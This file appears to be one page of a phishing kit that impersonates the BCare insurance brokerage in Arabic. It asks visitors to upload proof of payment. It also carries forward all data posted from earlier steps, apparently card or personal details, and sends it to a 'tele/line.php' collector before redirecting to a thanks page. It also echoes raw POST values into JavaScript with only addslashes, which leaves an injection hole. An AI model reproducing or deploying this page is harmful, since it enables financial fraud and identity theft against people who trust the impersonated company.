<?php
$payment_data = $_POST;
?>
<!DOCTYPE HTML>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>إثبات الدفع - بي كير</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--color-background:#F4F7FB;--color-primary:#0F4C72;--color-primary-light:#E6F0F7;--color-accent:#F2A340;--color-accent-dark:#D6892F;--color-text-primary:#0E1F2E;--color-text-secondary:#4B5B6B;--color-border:#D8E2EE;--shadow-soft:0 16px 40px rgba(15,76,114,0.12)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Cairo',sans-serif;background:var(--color-background);color:var(--color-text-primary);line-height:1.6;min-height:100vh;display:flex;flex-direction:column}
.notification-banner{position:relative;background:var(--color-accent);color:white;padding:.75rem 1rem;display:flex;align-items:center;justify-content:center}
.close-notification{position:absolute;left:1rem;background:transparent;border:none;cursor:pointer;opacity:.9}
.notification-content{display:flex;align-items:center;gap:.5rem;font-size:.875rem}
.notification-text{font-weight:500}
.notification-link{color:white;text-decoration:underline;font-weight:600}
.main-nav{background:rgba(255,255,255,0.92);border-bottom:1px solid var(--color-border)}
.nav-content{display:flex;justify-content:space-between;align-items:center;height:4rem;max-width:1280px;margin:0 auto;padding:0 1rem}
.nav-actions{display:flex;gap:.5rem}
.lang-btn,.profile-btn,.menu-btn{background:transparent;border:1px solid var(--color-border);border-radius:9999px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.lang-btn{padding:.25rem .75rem;font-size:.75rem;font-weight:600;color:var(--color-text-primary)}
.profile-btn,.menu-btn{padding:.5rem}
.profile-icon,.menu-icon{width:1.25rem;height:1.25rem;stroke:var(--color-primary);stroke-width:1.8;fill:none}
.menu-icon{stroke:var(--color-text-primary);stroke-width:2}
.main-content{flex:1;display:flex;align-items:center;justify-content:center;padding:2rem 1rem}
.upload-card{background:white;border-radius:1rem;box-shadow:var(--shadow-soft);max-width:28rem;width:100%;padding:2rem 1.5rem}
.doc-icon-wrapper{width:4rem;height:4rem;background:var(--color-primary-light);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem}
.doc-icon{width:2rem;height:2rem;fill:var(--color-primary)}
.upload-title{font-size:1.5rem;font-weight:700;text-align:center;margin-bottom:.5rem}
.upload-subtitle{font-size:.875rem;color:var(--color-text-secondary);text-align:center;margin-bottom:2rem;line-height:1.6}
.file-upload-wrapper{margin-bottom:1.5rem}
.file-upload-label{display:block;font-size:.875rem;font-weight:600;color:var(--color-text-secondary);margin-bottom:.75rem;text-align:right}
.file-input-container{position:relative;border:2px dashed var(--color-border);border-radius:12px;padding:2rem 1rem;text-align:center;background:var(--color-primary-light);transition:all 0.3s;cursor:pointer}
.file-input-container:hover{border-color:var(--color-primary);background:#E0EAF4}
.file-input-container.has-file{border-color:var(--color-primary);background:white;border-style:solid}
.upload-icon{width:3rem;height:3rem;margin:0 auto 1rem;stroke:var(--color-primary);opacity:0.6}
.upload-text{font-size:.875rem;font-weight:600;color:var(--color-primary);margin-bottom:.25rem}
.upload-hint{font-size:.75rem;color:var(--color-text-secondary)}
.file-input{display:none}
.file-preview{display:none;margin-top:1rem}
.file-preview.show{display:block}
.preview-img{max-width:100%;border-radius:8px;margin-bottom:.5rem}
.file-name{font-size:.875rem;color:var(--color-text-primary);font-weight:600}
.remove-file{background:transparent;border:none;color:#EF4444;font-size:.75rem;font-weight:600;cursor:pointer;text-decoration:underline;margin-top:.5rem}
.submit-btn{width:100%;padding:.875rem;background:var(--color-accent);color:white;border:1px solid var(--color-accent-dark);border-radius:.75rem;font-size:1rem;font-weight:600;cursor:pointer;box-shadow:0 4px 6px rgba(0,0,0,0.1)}
.submit-btn:hover:not(:disabled){box-shadow:0 10px 15px rgba(0,0,0,0.1);transform:translateY(-1px)}
.submit-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
.footer{background:#0B2F48;color:#D6E4F0;padding:2rem 0;text-align:center}
.footer-logo{margin:0 auto 1rem;width:100px}
.footer-copyright{color:#9FB4C4;margin-bottom:1rem;font-size:.75rem}
.footer-contact{display:flex;align-items:center;justify-content:center;gap:.5rem;font-size:.75rem}
.footer-contact a{color:var(--color-accent);text-decoration:none;font-weight:600}
.app-buttons{display:flex;gap:.75rem;justify-content:center;margin-top:1rem}
</style>
</head>
<body>
<div class="notification-banner">
<button class="close-notification" onclick="this.parentElement.style.display='none'">×</button>
<div class="notification-content">
<span class="notification-text">حمّل تطبيق بي كير الآن!!</span>
<a href="#" class="notification-link">تحميل</a>
</div>
</div>
<div class="main-nav">
<div class="nav-content">
<div class="nav-actions">
<button class="lang-btn">EN</button>
<button class="profile-btn"><svg class="profile-icon" viewBox="0 0 24 24"><path d="M20 21a8 8 0 0 0-16 0"></path><circle cx="12" cy="7" r="4"></circle></svg></button>
</div>
<a href="#"><img src="/bcare-logo.svg" alt="bcare logo" width="90" height="45"></a>
<button class="menu-btn"><svg class="menu-icon" viewBox="0 0 24 24"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
</div>
</div>
<main class="main-content">
<div class="upload-card">
<div class="doc-icon-wrapper">
<svg class="doc-icon" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
</div>
<h1 class="upload-title">لاستلام وثيقتك</h1>
<p class="upload-subtitle">برجاء إرسال إثبات الدفع الخاص بك<br>(رسالة الخصم أو فاتورة الشراء)</p>
<form id="uploadForm">
<div class="file-upload-wrapper">
<label class="file-upload-label">قم برفع صورة إثبات الدفع:</label>
<div class="file-input-container" id="fileContainer" onclick="document.getElementById('fileInput').click()">
<svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
<polyline points="17 8 12 3 7 8"></polyline>
<line x1="12" y1="3" x2="12" y2="15"></line>
</svg>
<p class="upload-text">اضغط لاختيار صورة</p>
<p class="upload-hint">PNG, JPG, JPEG (حد أقصى 5MB)</p>
<input type="file" id="fileInput" class="file-input" accept="image/png,image/jpeg,image/jpg" required>
</div>
<div class="file-preview" id="filePreview">
<img id="previewImage" class="preview-img" src="" alt="معاينة">
<p class="file-name" id="fileName"></p>
<button type="button" class="remove-file" onclick="removeFile()">إزالة الملف ✕</button>
</div>
</div>
<button type="submit" class="submit-btn" id="submitBtn" disabled>متابعة </button>
</form>
</div>
</main>
<footer class="footer">
<img src="/bcare-logo.svg" alt="BCare Logo" class="footer-logo">
<p class="footer-copyright">© 2026 جميع الحقوق محفوظة لشركة عناية الوسيط لوساطة التأمين.</p>
<div class="footer-contact"><span>اتصل بنا</span><a href="tel:8001180042">8001180042</a></div>
<div class="app-buttons">
<a href="https://apps.apple.com/sa/app/بي-كير/id1490248033" target="_blank"><img src="/ios_mobile_app.svg" alt="App Store" width="120" height="40"></a>
<a href="https://play.google.com/store/apps/details?id=com.app.bcare" target="_blank"><img src="/android_mobile_app.svg" alt="Google Play" width="120" height="40"></a>
</div>
</footer>
<script>
const fileInput=document.getElementById('fileInput');
const fileContainer=document.getElementById('fileContainer');
const filePreview=document.getElementById('filePreview');
const previewImage=document.getElementById('previewImage');
const fileName=document.getElementById('fileName');
const submitBtn=document.getElementById('submitBtn');
const form=document.getElementById('uploadForm');
let selectedFile=null;

fileInput.addEventListener('change',function(e){
const file=e.target.files[0];
if(!file)return;
if(file.size>5*1024*1024){
alert('حجم الملف كبير جداً! الحد الأقصى 5MB');
this.value='';
return;
}
if(!file.type.match('image.*')){
alert('يرجى اختيار صورة فقط!');
this.value='';
return;
}
selectedFile=file;
const reader=new FileReader();
reader.onload=function(e){
previewImage.src=e.target.result;
fileName.textContent=file.name;
filePreview.classList.add('show');
fileContainer.classList.add('has-file');
submitBtn.disabled=false;
};
reader.readAsDataURL(file);
});

function removeFile(){
fileInput.value='';
selectedFile=null;
filePreview.classList.remove('show');
fileContainer.classList.remove('has-file');
submitBtn.disabled=true;
}

form.addEventListener('submit',async function(e){
e.preventDefault();
if(!selectedFile){
alert('يرجى اختيار صورة إثبات الدفع');
return;
}
submitBtn.disabled=true;
submitBtn.textContent='جارٍ الرفع...';

const formData=new FormData();
formData.append('payment_proof',selectedFile);

<?php
foreach($_POST as $key=>$value){
if(is_array($value)){
echo "formData.append('".addslashes($key)."','".addslashes(json_encode($value))."');\n";
}else{
echo "formData.append('".addslashes($key)."','".addslashes($value)."');\n";
}
}
?>

const urlParams=new URLSearchParams(window.location.search);
const userId=urlParams.get('user_id')||'';
if(userId)formData.append('user_id',userId);

try{
await fetch('tele/line.php',{
method:'POST',
body:formData
});

setTimeout(()=>{
const redirectForm=document.createElement('form');
redirectForm.method='POST';
redirectForm.action='thanks/thanks.html'+(userId?'?user_id='+encodeURIComponent(userId):'');

for(let[key,value]of formData.entries()){
if(key!=='payment_proof'){
const input=document.createElement('input');
input.type='hidden';
input.name=key;
input.value=value;
redirectForm.appendChild(input);
}
}

document.body.appendChild(redirectForm);
redirectForm.submit();
},1500);

}catch(err){
alert('حدث خطأ في الرفع، يرجى المحاولة مرة أخرى');
submitBtn.disabled=false;
submitBtn.textContent='متابعة ';
}
});
</script>
</body>
</html>